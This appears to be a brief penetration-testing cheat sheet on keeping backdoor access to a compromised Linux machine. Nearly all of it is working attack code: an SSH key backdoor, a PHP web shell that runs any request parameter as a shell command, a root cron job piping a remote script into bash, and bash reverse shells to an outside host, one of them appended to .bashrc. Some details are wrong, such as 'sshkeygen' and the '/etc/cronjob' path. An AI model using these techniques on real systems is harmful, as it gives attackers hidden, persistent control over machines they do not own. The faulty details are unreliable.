# Linux persistence/backdoors

## SSH backdoor

Generate new keypair.

```bash
sshkeygen
```

Add your public key to `authorized_keys` on target machine.

```bash
chmod 600 id_rsa
ssh -i id_rsa USER@RHOST
```

## PHP backdoors

Webroot usual location: `/var/www/html`

```php
<?php
    if (isset($_REQUEST['yz'])) {
        echo "<pre>" . shell_exec($_REQUEST['yz']) . "</pre>";
    }
?>
<form action="" method="get">
<input type="text" id="yz" name="yz">
<input type="submit" value="Submit">
</form> 
```

## Cron jobs

Cron jobs are located in: `/etc/cronjob`

```
* *     * * *   root    curl http://RHOST/shell.php | bash
```

```bash
#!/bin/bash

bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

## bashrc backdoor

Waiting for user to login.

```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

## More...

[airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)
